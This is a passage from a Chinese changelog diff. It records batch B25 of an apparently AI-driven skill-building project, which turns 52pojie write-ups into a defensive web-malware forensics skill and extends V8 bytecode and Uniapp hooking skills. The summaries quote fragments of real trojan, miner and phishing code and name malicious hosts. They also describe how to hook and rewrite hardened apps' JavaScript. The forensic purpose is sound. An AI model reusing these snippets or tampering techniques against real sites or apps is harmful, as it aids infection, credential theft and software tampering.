@@ -3336,3 +3336,187 @@ python artifacts/skill-evolution/tools/append-b24-ledger.py
 - 候选新技能 `captcha-flow-orchestration` —— B5–B24 **十八次确认不新建**（证据池仍未跨越「单站一流程」到「可复用编排协议」的门槛）。
 - 已 `skip` 未建档：B1-17（小程序）、B7-18（某查查）、B8-131（某音滑块纯算）、B13-216（WX 小程序反编译）。
   **注**：B1-17 / B13-216 的「不建小程序技能」结论在 B22 已被**推翻并取代**（改判为「无最近邻模块 + 规模最大 ⇒ 建」），旧结论只保留可追溯性。
+
+## 批次 B25 · 2026-09-23（第二十五次执行）
+
+取材口径：待处理队列 **438 篇**中取**一个新开的归档通道 + 一个被放了很多轮的邻近薄区**，共 **19 篇**：
+① **网页恶意脚本 / 挂马 / 钓鱼 / 劫持取证 17 篇**（52pojie「病毒样本区 / 病毒分析区」与新开的 MAL2 通道）；
+② **V8 JSC 反编译 1 篇**、**Uniapp/Weex 混合 App hook 1 篇**。
+
+**为什么这次要新建技能**（三条判据与本库既有惯例对齐，且已做机械化取证）：
+
+① **没有最近邻模块**：全库 20 个技能里，只有 `code-analysis` 的名字沾边，但它自己的 `SKILL.md` 写的是
+「分析由调用方 Agent 自己完成，**本技能只负责采集证据、给出提示词模板、评分口径与产出结构**」——
+它的产出是「结构 / 风险评分契约」，与本族的「攻击链重建 / IOC 提取 / 定性分档 / 处置加固」是**两套产出**；
+其余 19 个技能的 description 与本轮主题零交集（全库 `grep` `恶意|钓鱼|挂马` 只命中**归档类技能**用于语料过滤的关键词，
+不是分析能力）。
+② **规模足够**：单批 17 篇同族文章，且上游归档线**专门为它开了一条通道**（持续供给）。
+③ **目标动词不同**：既有技能的目标动词是「还原 / 提取 / 绕过」，本族是「**定性 / 取证 / 处置**」。
+
+**产出**：**新建技能 1**、**演化 2**、**结构债结项 3**（含 1 项跨技能，详见「结构性收敛」）。
+
+| # | 文件 | md5 | 处理时间 | 关联技能 | 变更类型 | 核心萃取 |
+| --- | --- | --- | --- | --- | --- | --- |
+| 489 | `52pojie-20874-伪装GOOGLE广告的挂马方式.md` | `7a3f011b7611e721bc345bce7fbc7263` | 2026-09-23 | web-malware-forensics | create | **iframe 挂马链的结构模板（2009 年的样本，特征至今通用）**：同一 URL 连写 7 次（回源逐行计数） `document.write('<iframe … width=100 height=0>')` 再嵌一层；**cookie 去重标记** `document.cookie.indexOf('9B4A4C5EBF042C02') == -1` + `Then.setTime(Then.getTime() + 30*60*1000)` + `document.cookie = "A1="+ cookName +";expires="+ Then.toGMTString()`（⇒ 清掉这个 cookie 就能复现，它同时是「复现开关」与「封禁目标」）；**概率触发** `Math.floor(Math.random()*8000) > 6500`（约 19%）；**UA 分派**（`msie 7` 与否走不同分支）；**ActiveX CLSID 探测**（`GLIEDown.IEDown.1` / `snpvw.Snapshot Viewer Control.1` / `MPS.StormPlayer.1` / `IERPCtl.IERPCtl.1`，按结果加载不同 exploit 页）；**字符串拆分规避静态扫描**（`"GLI"+"EDown.I"+"EDown.1"`）。⇒ 本轮把这些提成「可机械识别的特征」写进 `injection-and-hijack-triage.md` §4。 |
+| 490 | `52pojie-527897-六年前的遗留(某网马解密实例By是昔流芳).md` | `b365c47a10626619c57b5ece1a6ca930` | 2026-09-23 | web-malware-forensics | create | **`%u` 网马 shellcode 的解包口径（本批唯一有机器可判 oracle 的一条）**：作者把分隔符放进变量 `dvd="%u"`，再以 `dvd+"54EB"+dvd+"758B"+…` 拼成四字符组串，最后 `unescape(拼接结果)`；**拼接顺序与变量声明顺序无关**（`YuTian + yutianuc + YuTian1 + YUtian2 + …`）⇒ 必须按 `unescape(...)` 里的**实际表达式顺序**拼。**口径 = 组内两字节必须交换**（`%uXXYY → YY XX`）：实测原文那串解出 `urlmon.dll` 与 `D:\YTexe`（不交换则得到 `rumlnod.llD\0\:TYxe`，无意义）⇒ 已做成脚本默认口径 + 自检断言，并保留 `--mode esc-noswap` 开关（判对错的判据是「能否读出 ASCII 串」）。另有三类**作者手工噪声**必须洗（`+` 分隔符 / 空格 / 缺字，如 `d+vd`、`%u95 D0`），以及「两趟」的真实成因（输出里又出现一层转义 / 双层转义）—— 本批同时**证伪**了「两趟是固定要求」的写法（工具默认 1 趟，只在输出里还有 `%` 时再加）。 |
+| 491 | `52pojie-1070300-简书网页劫持分析，使用 Chrome DevTools 调试 JavaScript 技巧，利用 CSP 预防劫持.md` | `6e1513ec1863eb23f30742bfc847b2b9` | 2026-09-23 | web-malware-forensics | create | **本批信息量最大的一篇**，贡献了整套「注入层判定 + 复现口径 + 加固」：① **三层排除法与分水岭**（源文件哈希 vs 响应体哈希；相等 ⇒ 运行时/扩展层；不等 ⇒ 传输层）；② **概率触发 / IP 限频的复现口径**（恶意分支「换 IP 之后才出现 1 次」、同 IP 每天首次触发；作者前后花了约两周）；③ **取证手法**：断点处直接打印被混淆函数的值、`acorn` + `acorn-walk` + `escodegen` 批量把 `d(<Literal>)` 就地替换、`jsnice.org` 反 uglify、**Local Overrides 改 `inspect.js` 强制出 `inspect fallback`**（只在 DevTools 开着时生效）、真机远程调试、Network 表头勾 Domain 排序（原文称为最省时间的技巧）；④ **完整指纹参数表**（`u`/`c` 两段共 40+ 项：系统版本、浏览器种类码 1–18、`history.length`、`navigator.hardwareConcurrency`、`gl.getParameter(ext.UNMASKED_VENDOR_WEBGL)`、`document.title.length`、`getElementById(…).offsetLeft` 等，以及最后的综合 hash）；⑤ **假信息检测**（`platform` 与 UA 打架 ⇒ 建 iframe 打 `fk.html?fk=fakeOS`，**把 cnzz 当计数器用**，静态托管即可统计）；⑥ **CSP 的写法与取舍**（必须把自己所有域名列全，连内联代码都要显式声明）与「**JavaScript 不支持反射 ⇒ 同页第三方脚本无法被运行时检测挡住**」这条能力边界；⑦ **供应链定性判例**：作者结论是「**准确来说不算是网页劫持，而是简书自己的一个广告供应商的问题**」⇒ 定档为「业务失控（供应链）」而非「网站被黑」。 |
+| 492 | `52pojie-865122-【转帖】对隐藏在图像文件中的 JavaScript 恶意代码的详细分析.md` | `bfc0e1f82e9986eacb16e6ab1cdcf358` | 2026-09-23 | web-malware-forensics | create | **隐写载荷的唯一权威源**：`canvas` + `getImageData` + `o['data'][p + 0x2]`（**B 通道**）+ 步长 4 + 上限 `q < 0x4b`（75 字符）+ `String.fromCharCode` 拼串 + `eval(rs)`；环境门槛是**字体探测** `isSupportFontFamily('-apple-system')` 与 `body.style.cssText != 'margin:\x200px;'`。三条纠正性结论：① **图片本身无害**（原文：「验证广告服务中单个图像文件的完整性是没有什么意义的」）；② 「图片看着正常」**不是证据**（载体是「一个白色的小条」）；③ **隐写是混淆手段的升级而非新漏洞** —— 同团伙早期版本用字符串拼接 + `WebKitPlaybackTargetAvailabilityEvent` 探测 + S3 外链。⇒ 本轮把四个参数（stride / 通道 / 上限 / 门槛）定成「从代码里读、不许猜」，并给了 DevTools 现取 `getImageData` 的一行 JS。 |
+| 493 | `52pojie-1381839-某网页js挖矿木马的简单分析.md` | `7bf398b098a84d69eaf142c923371f48` | 2026-09-23 | web-malware-forensics | create | **挖矿样本（两层壳 + 可复算的密钥派生）**：入口是 `<script async src=//bmst.pw/5889336x50.js>`；壳是「自实现 base64 解码 + 重复密钥 XOR」（`tf.b64d` / `tf.atob` / `tf.d`），且**密钥由参数派生**：`key = tf.d(p, "p")`，其中 `p = "BxkeFB8H"` —— 本轮独立复算得 `base64_decode("BxkeFB8H") XOR "p" = "window"`，并**反向验证** `base64("window" XOR "p") == "BxkeFB8H"` ⇒ 已做成脚本自检断言（这是单篇也能拿到、但必须自己算的一条）。IOC 侧：`WSSS: [["ws://ws1.bmst.pw/ws", "ws://ws2.bmst.pw/ws"]]`、`throttle=0.5`、**文件名后缀语义**（`x50` = 占 50% 时间、`x100` = 全速）、与 `deepMiner` 高度相似，以及「很多 JS 挖矿脚本都含 `Miner`/`autoThreads`/`threads`/`throttle` 关键字 + WebSocket + 设备类型检测」这三条归纳。 |
+| 494 | `52pojie-514804-关于最近QQ出现的网页盗号分析.md` | `1b562acbb6aa2d81ff9256aa1fbd5bde` | 2026-09-23 | web-malware-forensics | create | **定向投放 + 模板复用的样板**：`mobile.js` 里 UA 不含 iphone/ipad/android 就 `window.location.href = 'http://www.qq.com'`；`kr.js` 用正则 `^[1-9][0-9]{4,}$` 校验账号、空密码拦截后 `$.ajax` POST `/index/qq.php` `{q,p}`；返回 `1` 时**同时**跳 `user.qzone.qq.com/1064065158`（伪装成功 + 顺带刷人气）。归因侧：whois 反查同一注册人下多个站点，而原文作者自己也注明「也可能是盗号者买了他的网站」⇒ 本轮把「批量特征」（同模板 / 同字段名 / 同后缀批量注册）定为归因主判据，whois 只作辅助。 |
+| 495 | `52pojie-1048166-一个QQ网页盗号希望能够有大佬进行分析.md` | `feaf11116dc994ac588f2ce73abc286d` | 2026-09-23 | web-malware-forensics | create | **「顺带采集环境」是模板指纹**：伪造 QQ 邮箱登录页，除账号密码外还收集 IP 与城市 —— `<script src="http://pv.sohu.com/cityjson">` 取 `returnCitySN.cip` 写隐藏字段 `ip`；百度地图 JSONP `api.map.baidu.com/?qt=dec&oue=1` 取城市名、用 `escape()` 编码写隐藏字段 `dlwz`；入站需伪装 UA（`micromessenger`）否则被强制跳百度。⇒ 本轮把「隐藏字段里出现与业务无关的环境项」定为**模板指纹判据**。 |
+| 496 | `52pojie-239371-盗QQ网站的分析.md` | `ad595847ae6bc92d49399b831875adb0` | 2026-09-23 | web-malware-forensics | create | **批量域名随机化 + 回传字段名**：`url = new Array(16)`（16 个 `.tk` 主域）+ `urlx = Math.floor(Math.random() * url.length)` 随机选 + 拼 `h=".tk/"`；入口参数是 `?8270=<base64>`；回传 `POST /tool/c1/foom.asp?spmui=1098`，请求体字段名 `address=&addressb=&u=&p=&btnSubmit=`。⇒ 本轮把它作为「**同后缀批量注册**」与「**用字段名归因**」的实证（单个域名没有归因价值 —— 原文作者自己说了「换个网址就又可以继续蹦跶了」）。 |
+| 497 | `52pojie-822344-记一次找钓鱼页面源码.md` | `f8a421007482c917493b37c78a46c6fa` | 2026-09-23 | web-malware-forensics | create | **多层 `eval`/`document.write` 拆套的通用手法**：去掉可执行的外套后丢控制台，但**必须先声明它依赖的解密函数**（`function decode()` / `base64_decode` / `arcfour`）再调用；本例共四层：`eval` → `document.write('<script src=…qqapicdn.js>')` → 判 cookie 有无 `login` 分叉 → `arcfour(key, base64_decode(payload))`。另一条**必须早于页面**的经验：`navigator.platform` 在跳转后会被重写 ⇒ 只能靠扩展在 `document_start` 持续保持（而作者自己提示「用完记得卸载」）⇒ 本轮把它归入「**取证工具本身会被检测**」（`injection-and-hijack-triage.md` §5）。 |
+| 498 | `52pojie-961123-最近苹果CMS player.js文件挂马留后门的问题及解决.md` | `eb97e4f1c314ec9982299a781bb672f6` | 2026-09-23 | web-malware-forensics | create | **「被加密的第三方文件里藏加载语句」这一形态**：播放页 `player.js` 有一定概率加载 `//union.maccms.com/html/top10.js`。处置口径可直接复用：解密该文件 → 删掉加载那一行 → **重新加密回填**，并**连第二行 `base64EncodeChars` 后面的机密密文一起换**（只删加载语句不改键 = 等于没改）。⇒ 本轮把它落成「处置时必须连键一起换」的判据，归入 L1 源站。 |
+| 499 | `52pojie-984308-一个从chrome自动下载的js文件.md` | `b8673a3933068a6d672e911717359dd1` | 2026-09-23 | web-malware-forensics | create | **`sojson` 混淆器会自证**：文件开头就是 `var __encode = 'sojson.com'` + `(function(w){ w[_0xb483[0]] = _0xb483[1] })(window)`（即 `window._decode = "http://www.sojson.com/javascriptobfuscator.html"`）⇒ 这是**工具自证**，不是自研加密。两条可复用判据：① **字符串数组索引化** `window[__Ox43240[3]][__Ox43240[2]] = __Ox43240[4]` 展开才是 `window.location.href = "http://222.186.129.41/a/1.html"` ⇒ **静态搜 URL 会漏，要先把下标还原再搜**；② **删改留下的语法痕迹** —— `//优化跳转` 后面跟着空表达式 `window.location.;`（**必然 SyntaxError**）⇒ 说明手上这份**不是原始版本**。另外该样本的投毒条件是 **referrer 命中搜索引擎白名单**（`sogou|soso|baidu|google|youdao|yahoo|bing|118114|…`）。 |
+| 500 | `52pojie-1722593-刚查到一个疑似dns 劫持木马.md` | `d99f60bbdee598c4042d08a175745463` | 2026-09-23 | web-malware-forensics | create | **L2（传输层 / 中间层）注入的形态证据**：`js/jquery-3.5.1.min.js` 被换成了「加了一些代码的版本」，但**服务器上的文件是正常的**；无缓存刷新多次后**又恢复正常**；同一服务器上的另一个站也中招；多个 js（`jquery-3.1.0.js?1.0`、`bootstrap.js?1.0`、`popper.js?1.0`）被按同一模式追加 query。注入内容是 `document[_0x2551[9]](unescape(_0x2551[8]))` 解出 `hxxps://www.metamarket.quest/market.js`。⚠️ 原文给的三条归因（域名供应商 DNS / 宽带供应商 / 服务器被黑）**都没有留下可复核的哈希或解析记录** ⇒ 本轮把它当**反例**写进文档：本技能的产出要求就是补齐这些证据（§1.2 的五步排除法）。 |
+| 501 | `52pojie-1341701-一个邮件钓鱼网页的分析.md` | `780841b99ea789110e64985c735b5cd6` | 2026-09-23 | web-malware-forensics | create | **「合法第三方服务被滥用」这一档处置**：三层 `unescape` 解出一段 HTML，引三个外链 —— `https://smtpjs.com/v3/smtp.js`（**借它的邮件 API 回传凭证**）、jquery CDN、`http://api.ipify.org?format=jsonp&callback=getIP`（取受害者 IP）。⇒ 关键结论：**不能封第三方**（它是合法服务），处置写「该服务的滥用行为」，封的是钓鱼页与 token。 |
+| 502 | `52pojie-522902-简单分析芒果TV免费领取现金话费盗号网页.md` | `a1ce9cfd1e2fd9319c16c5c916d53b38` | 2026-09-23 | web-malware-forensics | create | **提高可信度的话术特征（只有一句话但很值钱）**：「第一次输入账号密码，无论正确与否，都会提示不对；第二次输入账号密码，无论正确与否，都会提示正确」⇒ 目的不是骗过验证，而是**让受害者以为第一次是手误，并保证服务器只收到格式正确的凭据**。⇒ 本轮把「第一次必错、第二次必对」提成凭证钓鱼的识别特征之一。 |
+| 503 | `52pojie-2033695-篡改猴脚本“获取网盘直链”劫持京东商品详情页分析.md` | `2a0b6e0aab6763cab80a19b36ccdb87a` | 2026-09-23 | web-malware-forensics | create | **油猴 / 篡改猴劫持的实证形态**：脚本初始化即 `POST http://124.222.238.158/pan.php?ver=&a=&href=`，服务端返回 `{page:"search", wrapper:[".more2_list>li"], timer:200, splName:8, jumpUrl:"https://ts.azkou.cn/ts.html?url="}` ⇒ **选择器 / 轮询间隔 / 批大小 / 跳转前缀全部由服务端下发**，所以「静态审计手里那份脚本」**必然漏**；随后批量 `POST /search.php` 换返利链接，最后 `$(base.panList[item.md5]).find('a').bind("click", …)` **替换原始点击行为**。外加作者实测的一个反直觉现象：「**这个 POST 在浏览器调试工具里看不到**」⇒ 本轮落成「**网络面板看不到 ≠ 没有外联**」（要同时 hook `GM_xmlhttpRequest`/`fetch`/`XHR`，并做系统级抓包）。 |
+| 504 | `52pojie-2112340-假飞书国际版钓鱼网站恶意脚本逆向分析报告.md` | `6593e8f5a48f5789d39dc4908779fa7f` | 2026-09-23 | web-malware-forensics | create | **「网页侧只是入口，真正载荷在主机侧」的完整链**：`Lark.bat` → PowerShell（`ShowWindow(0)` 隐藏窗口）→ 远程 `*.txt` → `script.php`（其实是 PS）内含 **AES-256-CBC** 载荷 → 再解一层 → 下载 `installer_*.exe` → 计划任务静默安装（`/VERYSILENT`）解压到 `C:\Users\Public\SVN\versions\<随机数>\` → 回传主机名 / 用户名 / 区域 / 时间到 `contar.php?id=mts` → 写标记 `%LocalAppData%\MachineCounter\executed.txt` → **自清理**（删 exe 与计划任务）。⇒ 本轮只取「四类持久化标记 + 回传端点 + 自清理行为」作为 IOC 口径，并在文档里**显式划定边界**：网页侧不执行、不解 AES，主机侧走 `desktop-client-reverse`。 |
+| 505 | `52pojie-1734167-【嶺上開花】油猴实战劫持人脸识别.md` | `df755859296ced4a5d566ef21d01ec4f` | 2026-09-23 | web-malware-forensics | create | **油猴脚本的「能力面」清单（审计要问的问题）**：伪造 `window.WebViewJavascriptBridge`（含 `WVJBCallbacks` 数组 + 隐藏 iframe 指向 `wvjbscheme://__BRIDGE_LOADED__` 的宿主注入探测），再按事件名分派 `callHandler(事件名, 参数, 回调)` —— 对 `examPushSign` 直接「弹文件选择器，把图片转 base64 回调回去」，于是**摄像头上传被替换成任意图片**。页面侧还有「到时间没返回就抛异常」的**定时陷阱**。⇒ 本轮落成审计结论的写法：「**能力面 = 事件名 × 可替换的回调**，这两列列全了才算审完」。 |
+| 506 | `52pojie-2115726-【原创】V8 JSC反编译成JS.md` | `a8998804d092d6a056fa07f91a4dcc04` | 2026-09-23 | desktop-client-reverse | evolve | **补上了「要看懂 V8 字节码」这条路的现成工具链**（原技能只有「给 d8 打补丁」的昂贵路线）：① **判据**：`.jsc` 首 4 字节 `0xC0DE0687` ⇒ V8 code cache，且「庆幸没有加壳」（头完整 ⇒ 外面没再包一层）；本轮**只把它当前缀判据**（`C0 DE`），并显式标注「低 16 位随版本变」是**推断**（来源只给了一个观测值）；② **前置条件**（原文点名「最重要的一点」）：**先拿到目标用的 V8 版本** —— 做法是「把 Electron 开调试，在 console 里读」；③ **三条路线**：`jsc2js`（基于 `view8`，内置一批 V8 版本，原文用到 `13.4.114.21`，零编译成本，产物「很像 IDA 的 F5」）/ `d8.exe -e "loadjsc('…/atom.jsc')" > disasm.txt` + `python view8.py --disassembled … out.js`（这条 d8 **就是原技能 §5.1 那个 `LoadJSC` 补丁的成品**）/ AI + CDP 动态调用（可读性最好，但**只覆盖被触发的函数**）；④ 作者判断付费服务「不值得特地给钱去弄」，并已把过程工具化为一个 skill。⇒ 本轮同时**改写了原技能「别解字节码」的绝对口径**：新增 §5.3，并明确「拿业务逻辑仍优先劫持；§5.3 只用于**看懂**；三条路都给不出完整源码，改回 `.jsc` 不可行」。 |
+| 507 | `52pojie-2021863-某Uniapp框架App hook方法.md` | `d49eaf3f19ad3695ceddc96991c26958` | 2026-09-23 | miniprogram-reverse | evolve | **非微信混合 App（Uniapp / Weex）的 JS 入口落点**（原文称「适用于全部 uniapp 框架的 App」）：这类 App 的 JS 入口**也叫 `app-service.js`，但没有包可解** ⇒ 只能从**原生渲染入口**抠；抓手是 `com.taobao.weex.WXSDKInstance.render` 的**第 2 个参数**（有 `String` 与 `Script` 两个重载，后者内容在 `Script.mContent` 字段里）；**第 4 个参数是「JS 名」**（JSON，含 `Plus_InitURL`，`app-service.js` 就在里面）⇒ 用它做分流。流程：frida **只打日志**确认重载与参数 → Xposed `findAndHookMethod` + `getObjectField(p.args[1], "mContent")` 读、`setObjectField` 回写（**改完立即生效，不重打包、不碰签名校验**）。可迁移结论：**加固只保护 dex / 资源，宿主自己的公开方法照样可 hook**。⇒ 一并写进 `runtime-and-debug.md` §4.4 + 分流判据表 + 排错 2 条。 |
+
+### 本批次技能变更汇总（B25）
+
+| 技能 | 变更类型 | 主要落点 |
+| --- | --- | --- |
+| `web-malware-forensics` | **create** | `SKILL.md`（三条硬约束 / 12 行分流判据 / 7 步工作流含 1 个 🔴 CHECKPOINT / 失败模式 10 行 / 反例 10 条 / 与 8 条技能边界）+ 三个 references：`injection-and-hijack-triage.md`（三层排除法 / 分水岭 / L2 五步排除 / `UA × referrer` 矩阵 / 运行时写入点 hook 表 / 概率与 IP 限频复现口径 / 真机远程调试 / 扩展与油猴审计清单 / 挂马链 8 类结构特征 / 取证工具自身风险 7 项检测点 / 排错 9 条）、`payload-and-obfuscation.md`（**五类壳三联表** + 网马 `%u` 口径与噪声 / `sojson` 自证 / packer / base64+XOR（含密钥派生）/ base64+RC4 / 隐写 / AES 落地链 / 拆壳顺序与停止条件 / 排错 11 条）、`indicators-and-response.md`（IOC 六类与「比 URL 更值钱的 5 条」/ 归因 8 类信号 / 凭证回传三条路径 / 定性四档与证据行 / 清理清单 / CSP 与 HttpOnly 与 HSTS 与第三方治理 / 报告模板 / 排错 7 条）+ 两个 scripts：`payload_unpack.py`（五子命令，`--selftest` **65 项**）、`ioc_extract.py`（`--selftest` **56 项**）。 |
+| `desktop-client-reverse` | evolve | `references/jsc-and-v8-bytecode.md`：§1 的 V8 行**改写**（从「没有可依赖的公开 magic」改成 `C0 DE` **前缀**判据 + 「低 16 位随版本变」标注为推断）、**新增 §5.3**（V8 版本前置 / `jsc2js` 与 `view8` / `d8 … loadjsc` 两段式 / AI+CDP 的覆盖边界 / 路线选择三条）、坑表 **+3**（#11–#13）、反例 **+2**；`SKILL.md`：分流判据 **+1 行**（首 4 字节 `C0 DE`）、工作流第 6 步补「看懂时的顺序」、资源小节同步。 |
+| `miniprogram-reverse` | evolve | `references/runtime-and-debug.md`：**新增 §4.4**（Uniapp / Weex 混合 App 从 `WXSDKInstance.render` 抠 `app-service.js`：两个重载的区分、frida 日志脚本、Xposed 读改回写、`Plus_InitURL` 分流、与小程序的关系），排错 **+2**；`SKILL.md`：分流判据 **+1 行**（拿不到包但出现 `app-service.js`）、资源小节同步。 |
+
+### 结构性收敛（B25）
+
+| 项 | 处置 |
+| --- | --- |
+| **`description` 超限（> 1024 字符）2 处** | 自算全库 21 个技能：`stream-drm-reverse` **2490**、`miniprogram-reverse` **1730** 超标（其余 ≤ 995）。⇒ 本轮把两者压到 **983 / 993**，做法是**删解释性散文、保留全部独有触发词**；被删的 5 个词里 4 个是第三方工具名（`wxapkg-convertor` / `UnpackMiniApp` / `getStorageSync` / `session_id`），**仍在 `references/` 里出现**（已逐条 grep 确认），知识未丢；第 5 个 `x-evone-signature` **在独立评审中被指出「删得不对」**（它是签名头触发词、`references/` 里没有）⇒ **已恢复**（description 973 → 993，仍在限内）。`desktop-client-reverse` 在**净增 5 组新触发词**（`jsc2js` / `view8` / `0xC0DE0687` / `loadjsc` / 「V8 版本对不上」）的同时 **1138 → 943**。⇒ 全库 21 个技能 description 现均 ≤ 1000（最长 `web-verify-patcher` 995）。 |
+| **`miniprogram-reverse` 自检项数漂移** | `SKILL.md` 声称 `wxapkg_tool.py --selftest` **27 项**，实跑 **29 项** ⇒ 已改正（与 B23 修 description 同类的「文档与实际不符」）。 |
+| **新技能与 `code-analysis` 的分工** | 在 `web-malware-forensics/SKILL.md` 的边界小节显式写死：`code-analysis` 输出「结构 / 风险评分契约」，本技能输出「攻击链 / IOC / 处置」三件；**避免两处各写一份「风险评分」**（B20「同一份知识写两处必然分叉」）。 |
+
+### 证伪与审计留痕（B25）
+
+```bash
+# ⚠️ 以下命令均以**仓库根**为工作目录
+
+# 1) 新脚本自检（65 + 56 项）
+python .agents/skills/web-malware-forensics/scripts/payload_unpack.py --selftest
+python .agents/skills/web-malware-forensics/scripts/ioc_extract.py --selftest
+
+# 2) 既有脚本回归（22 + 29 + 15 + 29 + 11）
+for s in asar_offset_repair jsc_xxtea_tool byte_flag_patch; do
+  python .agents/skills/desktop-client-reverse/scripts/$s.py --selftest; done
+python .agents/skills/miniprogram-reverse/scripts/wxapkg_tool.py --selftest
+python .agents/skills/miniprogram-reverse/scripts/const_bruteforce.py --selftest
+
+# 3) 真实样本实跑：网马 shellcode 解出 urlmon.dll / D:\YTexe
+python .agents/skills/web-malware-forensics/scripts/payload_unpack.py esc \
+  --in artifacts/skill-evolution/b25-run-20260923/esc-input-527897.txt --strip-noise --hexdump 512
+
+# 4) 真实样本实跑：源文章的 IOC 提取（含「定性提示」）
+python .agents/skills/web-malware-forensics/scripts/ioc_extract.py \
+  --in "docs/references/52pojie-1381839-某网页js挖矿木马的简单分析.md" --format markdown
+
+# 5) 来源保真度（19 篇源文件逐条断言）
+python artifacts/skill-evolution/tools/b25-verify-sources.py
+
+# 6) 故障注入阳性验证（7/7 变红）
+python artifacts/skill-evolution/tools/b25-fault-injection.py
+
+# 7) 机械校验 + 双镜像
+node artifacts/skill-evolution/tools/check_skill_integrity.js --root . --markdown
+python artifacts/skill-evolution/tools/b20-mirror-sync.py
+
+# 8) 台账幂等复跑（应打印「已登记，跳过」）
+python artifacts/skill-evolution/tools/append-b25-ledger.py
+```
+
+**故障注入明细（基线绿 → 注入后红）**：
+
+| 注入点 | 结果 |
+| --- | --- |
+| `payload_unpack`：esc 的组内字节序交换被改掉 | 自检 58/65 → 红 ✓（**说明那条 oracle 真的在守**） |
+| `payload_unpack`：packer 的「词元缺失必须报错」守卫被关掉 | 自检 64/65 → 红 ✓（防「静默产出垃圾」） |
+| `payload_unpack`：base64 的 URL-safe 替换被删 | 异常退出 → 红 ✓ |
+| `ioc_extract`：凭证钓鱼的定性规则被关掉 | 自检 55/56 → 红 ✓ |
+| `ioc_extract`：链式挂马的定性规则被关掉 | SyntaxError → 红 ✓（**异常形式失败也算通过**：判据是「非静默通过」） |
+| `b25-verify-sources`：一条针改成不可能命中的串 | 「未命中 1 条」→ 红 ✓ |
+| 校验器：`references/` 引用被改成悬空 | 阴性 `rc=0` / 阳性 `rc≠0` → 红 ✓ |
+
+**⚠️ 本轮故障注入抓到 2 个「假阳性注入」（自身缺陷，已修）**：① 把保真度脚本复制到临时目录，会让它因 `__file__`
+推不出仓库根而以 `FileNotFoundError` 变红 —— 那是**假红**（根本没测到那条针）⇒ 改成落在原目录，并在判据里加
+「输出必须含『未命中』」；② 迷你仓里把 `references/*.md` 写成占位 `x`，会让校验器因**跨文件 §小节引用**缺失而先变红
+⇒ 阴性对照自己就挂了（与 B20「注入是否成功要一起断言」同型）⇒ 改成拷真文件。
+
+### 独立评审（B25）
+
+**方式**：**2 名独立盲评审员**（A：事实保真度 + 可执行性；B：新技能必要性 + 集成一致性 + 结构债），
+只看产物与源文件、不给作者自评、**不允许改文件**；两人都被要求**实跑**其引用的每条命令、并给出证据。
+**合计 8 项缺陷（2 项阻断级 + 6 项次要），全部回源复核后处置完毕**；结论均为 **needs-fix**，无 revert。
+逐条见下方「评审结论」。
+
+### 评审结论（B25）
+
+**结论：needs-fix** —— 合计 **2 项阻断级 + 4 项次要**，全部在本轮内回源复核后处置完毕（1 项确认属"已修过、评审看到的是旧状态"）。
+**本轮没有任何一条意见来自作者自评**；下述每条都带证据（文件位置 + 实跑输出）。
+
+#### 阻断级（2 项）
+
+| # | 缺陷 | 证据 | 处置 |
+| --- | --- | --- | --- |
+| 1 | 技能双镜像内容不一致（`web-malware-forensics/references/payload-and-obfuscation.md`） | 评审视角下 `node check_skill_integrity.js` 报阻断项 1 | **确认成立但已过时**：该差异来自作者本轮用 `sed` 修文档引用后**未及时重新镜像**；评审快照早于作者的第二次 `b20-mirror-sync.py --sync`。现已复跑：`content diff: 0`、机械校验 **0 阻断 0 告警**。⇒ **教训记档**：改完技能文件要**立刻**镜像，别等到最后一起做（否则并行的评审会看到不一致的中间态）。 |
+| 2 | `web-malware-forensics/SKILL.md` 分流判据表把 `sojson` 的落点写成「（§2.2）」，但 `payload-and-obfuscation.md` §2.2 是 `packer` 壳，`sojson` 在 §2.1 | 评审给的文件/小节 + 作者复核 | **成立，已改**为「直接还原，别当加密（`payload-and-obfuscation.md` §2.1）」。 |
+
+#### 次要（4 项）
+
+| # | 缺陷 | 证据 | 处置 |
+| --- | --- | --- | --- |
+| 3 | `SKILL.md` 失败模式表里「从写入点倒推（§2.1）」**没有说明是哪个文件的 §2.1** —— 指向的是 `injection-and-hijack-triage.md` 的 §2.2，SKILL.md 自己的 §2.1 是工作流第 1 步 | 评审指出 + 作者复核 | **成立，已改**为显式路径「（`injection-and-hijack-triage.md` §2.2）」。 |
+| 4 | 压缩 `miniprogram-reverse` 的 `description` 时删掉了 `x-evone-signature`，而它**没有**在 `references/` 里出现 ⇒ 该触发词**真的丢了** | 评审 `grep -rl 'evone'` 为空；作者复核确认（备份里 `SKILL.md` 计数为 1、当前为 0） | **成立，已恢复**（`description` 973 → 993，仍在 1024 限内）。⇒ 修正了本批"删触发词都安全"的自我判断：**判据应是"删的词是否在正文里还有"**，`x-evone-signature` 恰好只活在 description 里。 |
+| 5 | 证伪留痕的 `bash` 代码块里命令用相对路径，换目录照抄会失败 | 评审建议 | **部分采纳**：留痕块的用途是记录"跑过什么"，本轮在块首补了一句「以下命令均以仓库根为工作目录」；不改写成绝对路径（绝对路径会带本机用户名，反而不可复现）。 |
+| 6 | `web-malware-forensics/SKILL.md` 边界小节把「浏览器扩展**安装包**」一并划给 `desktop-client-reverse`，措辞不准（安装包不是桌面壳） | 评审指出 | **成立，已改**：桌面壳一条改成「恶意代码被打包进桌面客户端 / 单文件 exe（asar / `.jsc` / pkg 打包产物）」；**另拆出一条**「恶意代码在浏览器扩展 / 油猴脚本里 ⇒ 本技能负责审计与定性（§3）」。 |
+
+#### 评审员明确给出的"值得保留"（原文保留）
+
+- `payload_unpack.py` 的 `esc` **双口径开关 + 自检里的正/负对照**（swap 必须能读出 `urlmon.dll`，noswap 必须读不出）——
+  评审自行复算后确认与源文章一致（源文章的 `%u54EB` 组按 `YY XX` 落盘才是合法 x86 指令 `EB 54`）。
+- `ioc_extract.py` 的「定性提示」**显式声明为机械判据组合、不是结论**，且每个判据都带命中的样例串。
+- 保真度脚本先做 **markdown 转义归一化**再匹配（否则语料里的 `30\*60\*1000` 会假未命中）。
+
+---
+
+### 第二次评审（评审员 A：事实保真度 + 可执行性）—— **needs-fix，2 项，本轮全修**
+
+评审方式：**45 条事实抽查 + 14 条命令实跑**（含两次 `--selftest`、
+§3.1 的 `b64-xor --key-from BxkeFB8H --key-xor p` 真实调用、`esc` 真跑、`packer` 真跑、台账幂等复跑、
+以真实源文件跑 `ioc_extract.py`），**无调用错误**。
+
+| # | 严重度 | 缺陷 | 证据 | 处置 |
+| --- | --- | --- | --- | --- |
